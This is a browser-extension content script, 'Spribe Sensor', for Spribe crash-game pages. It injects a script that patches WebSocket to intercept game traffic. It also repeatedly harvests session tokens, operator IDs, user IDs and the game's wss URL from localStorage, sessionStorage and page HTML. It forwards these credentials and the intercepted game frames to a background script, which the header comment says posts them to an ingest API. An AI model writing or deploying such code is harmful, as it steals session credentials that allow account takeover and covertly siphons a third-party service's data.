// Spribe Sensor — content.js (MAIN world via injected.js + isolated bridge)
// Strategy:
//  1. Inject `injected.js` into page context to patch WebSocket BEFORE the game connects.
//  2. Sniff sessionToken / operator / dynamic wss URL (userid, gameZone) from
//     localStorage, sessionStorage, page scripts, and the intercepted WS URL.
//  3. Parse Spribe frames for current_multiplier + final game_result (crash point).
//  4. Forward packets to background.js -> POST /api/ingest (refresh-safe: re-push credentials on change).

(function () {
  const harvestCredentials = () => {
    const creds = { sessionToken: null, operator: null, wsUrl: null, userid: null, gameZone: null };
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        const v = localStorage.getItem(k) || "";
        if (!creds.sessionToken && /session|token/i.test(k) && v.length > 12) creds.sessionToken = v.slice(0, 512);
        if (!creds.operator && /operator/i.test(k)) creds.operator = v.slice(0, 64);
        const m = v.match(/wss:\/\/[^\s"'\\]+spribegaming[^\s"'\\]*/);
        if (m && !creds.wsUrl) creds.wsUrl = m[0].slice(0, 400);
      }
    } catch {}
    try {
      for (let i = 0; i < sessionStorage.length; i++) {
        const k = sessionStorage.key(i);
        const v = sessionStorage.getItem(k) || "";
        if (!creds.sessionToken && /session|token/i.test(k) && v.length > 12) creds.sessionToken = v.slice(0, 512);
        const m = v.match(/wss:\/\/[^\s"'\\]+spribegaming[^\s"'\\]*/);
        if (m && !creds.wsUrl) creds.wsUrl = m[0].slice(0, 400);
      }
    } catch {}
    try {
      const html = document.documentElement?.innerHTML || "";
      const m = html.match(/wss:\/\/[^\s"'\\<>]+spribegaming[^\s"'\\<>]*/);
      if (m && !creds.wsUrl) creds.wsUrl = m[0].slice(0, 400);
      const t = html.match(/(sessionToken|session_token)["'\s:=]+([A-Za-z0-9._\-]{12,512})/);
      if (t && !creds.sessionToken) creds.sessionToken = t[2];
    } catch {}
    if (creds.wsUrl) {
      try {
        const u = new URL(creds.wsUrl.replace(/^ws/, "http"));
        creds.userid = u.searchParams.get("userid") || u.searchParams.get("userId");
        creds.gameZone = u.searchParams.get("gameZone") || u.searchParams.get("gamezone");
      } catch {}
    }
    return creds;
  };

  let lastCredsSig = "";
  const pushCreds = (extra = {}) => {
    const c = { ...harvestCredentials(), ...extra };
    const sig = [c.sessionToken, c.wsUrl, c.operator].join("|");
    if (sig === lastCredsSig) return; // refresh handling: only push on change
    lastCredsSig = sig;
    chrome.runtime.sendMessage({ kind: "spribe-credentials", creds: c }).catch?.(() => {});
    // Also emit as window event for debugging
    window.dispatchEvent(new CustomEvent("spribe-sensor-creds", { detail: c }));
  };

  // Listen to frames decoded by injected.js (page context -> content via window.postMessage)
  window.addEventListener("message", (ev) => {
    if (ev.source !== window) return;
    const d = ev.data;
    if (!d || d.__spribe_sensor !== true) return;
    if (d.kind === "ws-open") pushCreds({ wsUrl: d.url });
    else if (d.kind === "ws-msg") chrome.runtime.sendMessage({ kind: "spribe-frame", raw: String(d.data).slice(0, 4000), url: d.url }).catch?.(() => {});
  });

  // Inject page-context interceptor ASAP
  try {
    const s = document.createElement("script");
    s.src = chrome.runtime.getURL("injected.js");
    s.onload = () => s.remove();
    (document.head || document.documentElement).appendChild(s);
  } catch {}

  // Credential watchers: push on change (covers page refresh / token rotation)
  pushCreds();
  setInterval(pushCreds, 3000);
  window.addEventListener("load", () => setTimeout(pushCreds, 1500));
  // SPA navigation / refresh detection
  let lastHref = location.href;
  setInterval(() => {
    if (location.href !== lastHref) { lastHref = location.href; lastCredsSig = ""; pushCreds(); }
  }, 1500);
})();
